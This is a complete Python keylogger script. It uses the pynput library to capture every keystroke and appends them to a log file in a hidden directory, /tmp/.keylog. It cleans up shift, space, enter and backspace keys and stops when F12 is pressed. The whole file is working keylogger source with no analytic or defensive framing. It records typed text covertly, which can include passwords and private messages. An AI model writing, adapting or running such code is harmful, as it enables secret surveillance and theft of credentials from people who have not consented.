from pynput.keyboard import Listener
import os

def f(key):
    if not os.path.isdir("/tmp/.keylog/"):
        os.mkdir("/tmp/.keylog")

    key = str(key)
    key = key.replace("'", "")
    if key == 'Key.space':
        key = ' '
    # if key == 'Key.alt':
    #   key = ''
    # if key == 'Key.ctrl':
    #   key = ''
    # if key == 'Key.caps_lock':
    #   key = ''
    if key == 'Key.shift':
        key = ''
    if key == 'Key.shift_r':
        key = ''
    # if key == 'Key.cmd':
    #   key = ''
    if key == 'Key.enter':
        key = '\n'
    if key == 'Key.backspace':
        key = ''
        with open('/tmp/.keylog/log.txt', 'rb+') as f:
            f.seek(-1, os.SEEK_END)
            f.truncate()
    # if key == 'Key.f12': windows
    #   raise SystemExit(0)
    if key == 'Key.f12': 
        exit(0)

    with open('/tmp/.keylog/log.txt', 'a') as file:
        file.write(key)


with Listener(on_press=f) as listener:
    listener.join()
